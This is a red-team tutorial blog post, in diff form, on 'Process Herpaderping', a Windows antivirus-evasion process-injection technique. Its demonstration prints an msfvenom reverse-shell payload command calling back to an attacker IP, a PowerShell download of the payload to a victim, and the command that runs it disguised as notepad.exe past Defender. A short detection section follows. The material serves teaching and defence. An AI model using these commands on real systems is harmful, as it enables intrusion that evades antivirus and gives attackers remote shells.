@@ -1,0 +1,93 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/defense-evasion/" rel="category tag">Defense Evasion</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
+            <h1 class="post-title entry-title">Process Herpaderping (Mitre:T1055)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/process-herpaderping-mitret1055/" rel="bookmark"><time class="entry-date published" datetime="2022-04-24T17:40:13+00:00">April 24, 2022</time><time class="updated" datetime="2025-06-23T18:21:15+00:00">June 23, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;"><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/jxy-s/herpaderping">Johnny Shaw</a> </strong></span>demonstrated a defense evasion technique known as process herpaderping in which an attacker is able to inject malicious code into the mapped memory segment of a legit process before the inspection of the created process actually begins. This helps an attacker in bypassing defenses and also privilege escalation. While MITRE hasn’t associated a sub-ID to the technique, we deemed it appropriate to write the article under process injection and defense evasion methods.</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>MITRE TACTIC: Defense Evasion (TA0005) and Privilege Escalation (TA0004)</strong></span></li>
+<li><span style="color: #000000;"><strong>MITRE Technique ID: Process Injection (T1055)</strong></span></li>
+</ul>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Background</strong></span></li>
+<li><span style="color: #000000;"><strong>Process Herpaderping</strong></span></li>
+<li><span style="color: #000000;"><strong>Demonstration</strong></span></li>
+<li><span style="color: #000000;"><strong>Detection</strong></span></li>
+<li><span style="color: #000000;"><strong>Conclusion</strong></span></li>
+</ul>
+<h3><span style="color: #800000;"><strong>Background</strong></span></h3>
+<p><span style="color: #000000;">Security products use a Windows callback PsSetCreateProcessNotifyRoutineEx to take action when they map a new process in memory and determine whether to allow the process to execute (if it is safe or not).</span></p>
+<p><span style="color: #000000;">However, the system only initiates the actual AV inspection when the first thread of the respective process starts and not when it creates the process object.</span></p>
+<p><span style="color: #000000;">This creates a window of opportunity for an attacker to create and map a process, then change the file’s content and thereafter create initial thread.</span></p>
+<h3><span style="color: #800000;"><strong>Process Herpaderping</strong></span></h3>
+<p><span style="color: #000000;">Herpaderping is an English slang that describes a person who often becomes the target of ridicule due to their obliviousness. Johnny Shaw developed a technique called Process Herpaderping that modifies the contents of a file after mapping it in memory but before initiating the first thread to evade anti-virus/defense mechanisms. The AV cannot determine whether to continue or stop execution since the file behind the process has now changed. The original write-up, which is very clearly written, can be found <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://jxy-s.github.io/herpaderping/">here</a></strong></span>.</span></p>
+<p><span style="color: #000000;">Steps followed are:</span></p>
+<ul>
+<li><span style="color: #000000;">Create a target file (benign file like cmd.exe) and keep the file handle open.</span></li>
+<li><span style="color: #000000;">Map the file as an image section</span>
+<ul>
+<li><span style="color: #000000;"><strong>NtCreateSection</strong> with <strong>SEC_IMAGE</strong> flag set</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;">Create the process object using the section handle</span>
+<ul>
+<li><span style="color: #000000;"><strong>NtCreateProcessEx</strong></span></li>
+</ul>
+</li>
+<li><span style="color: #000000;">Copy our payload and then using the previously open file handle, obscure the payload on disk.</span></li>
+<li><span style="color: #000000;">Create the initial thread in the process</span>
+<ul>
+<li><span style="color: #000000;"><strong>NtCreateThreadEx</strong></span></li>
+</ul>
+</li>
+</ul>
+<p><span style="color: #000000;">At this point, the kernel will trigger the process creation callback (PsSetCreateProcessNotifyRoutineEx), and the contents on disk will not match what was mapped. Inspection of the file at this point will result in incorrect attribution.</span></p>
+<ul>
+<li><span style="color: #000000;">Close the handle so that execution can begin properly</span>
+<ul>
+<li><span style="color: #000000;"><strong>IRP_MJ_CLEANUP</strong></span></li>
+</ul>
+</li>
+</ul>
+<p><span style="color: #000000;">Since contents of what is being executed are hidden, inspection at this point will result in incorrect attribution.</span></p>
+<h3><span style="color: #800000;"><strong>Demonstration</strong></span></h3>
+<p><span style="color: #000000;">The official source code can be downloaded from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/jxy-s/herpaderping">here</a></strong></span>. All the submodules have to be included as well so follow the following procedure to effectively download the code using git.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/jxy-s/herpaderping.git
+cd .\herpaderping
+git submodule update --init --recursive</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhh9u6wvPqUVMgAV0G191xOQja_nxEYPyYm6DqN6HQcX4sZGP7q8Y_DpphRGjH4GFFA3DZXxfe7H_3M5AkjeHEsROab29vVD4UW1vpDSQya_qlonEbWiVObGrhCfa-8P3deBiweQfYRN2oXxeDDBScvJNP9sSHNQOhRY5QzszwEG-MvE_A3xErll0JDpQ/s16000/1.png"/></p>
+<p><span style="color: #000000;">It can now be compiled for release using Visual Studio (I used VS 2022). I forked the repo and uploaded compiled binary for your ease of access <a style="color: #000000;" href="https://github.com/harshitrajpal/herpaderping_compiled">here</a>. It can now be run using cmd to check if its working.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjjK_haXV3khnuuVO0Ka2qc7VFzlgIwEV04Ti86vOGug8bm9eyPFTm49r6DJ7dUj7vyru14ZQGplyZeEOKUkwUs5nQlqbAg7crStUM70KTOfNGusgV4nERh1E3AfSgFe7Q8wCT1HUdo5IO2c1WvbRxpMaJZOE6mIHpus3T2vP2Rj8URSM9Am3DcT6jqXA/s16000/2.png"/></p>
+<p><span style="color: #000000;">Now, our payload can be executed using a simple command like this:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ProcessHerpaderping.exe payload_file target_file</pre>
+<p><span style="color: #000000;">We can use the third option as well but not right now. Let’s create a payload first.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.89 LPORT=1234 -f exe &gt; payload.exe</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgqctq8uZ717_gO88MVFqUbBw0YcIzsm0lkeHHMMMTsoMtn6NiBgU6Aovqal49vFLXQzeLXQJ4Ts6pwwb-0KBESiwzbYA-K_t7VdTEgIbaOkAauaVu1lDvu-qLztA0Iu4VTjgTRJtFHY4_dQirkEg9Ux4y2umZOLbbpsNzHIFpH6Xjce-e41sNJR1hmkQ/s16000/3.png"/></p>
+<p><span style="color: #000000;">Now we can transfer the executable and payload to our victim.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell wget 192.168.0.89/payload.exe -O payload.exe</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_NcECLlPhDWq_UuhsVZldKEuCxMgylNRUpTT_QQU2OSWUefIN9lMJZp8mhfmxyuandBWtCZZmqA-8jXLlyx4PoLDWdu6iiYhYD4ke4tLL2jgHJWVpTsAuwI8AHfXfwW3HxzUt_IrskmSyUvlQspiPg5K7OMjbwdKIPpt3beRIxTyfsGhwZhVMUuQpQQ/s16000/4.png"/></p>
+<p><span style="color: #000000;">Once we have transferred the payload successfully, we can run the process Herpaderping executable to run our payload hidden under some other legit executable, like notepad.exe.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ProcessHerpaderping.exe payload.exe notepad.exe</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjpRwvGvP1q3By-f7Np8jwIgbMAjbZWCKEBdanx_G5VJDVWTyK8_ZKsay13gLth-_GlyKxDrXi-l7Q6bdiD78TFiWLQqu8SvSBfHOWQGl_ekiN9KwDWj_vaJf1ctala1sAAmgb8Xuses_kcf0lwYCuGp1fpbYsHUGTQXZXHz4GZusASjFc0v2iNkrDCMw/s16000/5.png"/></p>
+<p><span style="color: #000000;">As you can see, we now must have received a reverse shell on port 1234 (as our payload suggested). This indicates a successfully herpaderp of our payload under notepad.exe</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgNIK41AA3raqIsRBbz3nw8JQTF8OFomdjhutpXHwVbEUgiqbPWyWVqiQbaMj0_YdCdC5UgZtcJ9fOe6LTGzSTDadKGXW7EZLECWeaHEAR0ho8vMG8WpOTM9Mgk2vzMbDbv9b1ArdJH34Eq7Dde6yoOPrP0FzTt8ugCdtonhRp382HpVyS6PHHn2rESlg/s16000/6.png"/></p>
+<p><span style="color: #000000;">Also, in the victim system, one can re-affirm that defender is activated and has not detected our payload as malicious when it is run!</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgJ2GhUVSL48NnD7ecx9irJXAAk-xfz_tSRncuYdpiCyoJCSFzMMMzI_73bG1Uyfw-tzvBjs937fzZrua0gYqZlxhTU8rHR11iTwT087ULpEKQcE9WNuK7USoTJnbtlXJ1O3uiHpKlPbC9fbg3_3ZmfNnIFx2lZw1_Cj7hxWTwlihHkEtHhXbwC1QGY2Q/s16000/7.png"/></p>
+<p><span style="color: #000000;">Upon inspecting this attack in process explorer on the victim system, you should get suspicious if you see suspicious child processes spawning out of legit executables. Here, cmd.exe is spawning out of notepad.exe which doesn’t allow the running of executables indicating a process injection attack!</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2xKq9AyCac3T6DHbzCqpMTrWeoET_uSSDL00QAv091pZ53aBC25bwfrfdo8eiZb9A_e0IlZdTsSGWJ8_EbRje0_eAlZwd2O4b3BpkvIx_Fl8TAcmZ_n-Bwdyrf_jlNkRI-LTHAtfefPSigXWTnaspRjLsSpt4aQ1IkYUI5U0nluDEkM0FxqnhLtdawg/s16000/8.png"/></p>
+<h3><span style="color: #800000;"><strong>Detection</strong></span></h3>
+<ul>
+<li><span style="color: #000000;">AV can update its signatures to detect known functions like IRP_MJ_CLEANUP or NtCreateProcessEx and then further conduct behaviour analysis to block process injection during runtime.</span></li>
+<li><span style="color: #000000;">Use <strong>PsSetCreateThreadNotifyRoutineEx</strong> instead of PsSetCreateProcessNotifyRoutineEx as the former calls back at the time of thread insertion as opposed to when the thread begins executing.</span></li>
+<li><span style="color: #000000;">Sysinternal’s suite Sysmon can detect process tampering. Download <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon">here</a></strong></span>.</span></li>
+</ul>
+<h3><span style="color: #800000;"><strong>Conclusion</strong></span></h3>
+<p><span style="color: #000000;">The article discusses a defense evasion technique called Process Herpaderping, which obscures the true intentions of a process by modifying the content on disk after mapping the image but before it starts executing. This confuses security products like Defender and returns incorrect attribution; yet, the payload executes nevertheless. A short demonstration also showcases it as a PoC. Hope you liked the article. Thanks for reading.</span></p>
+<p><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact<strong> <a class="broken_link" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
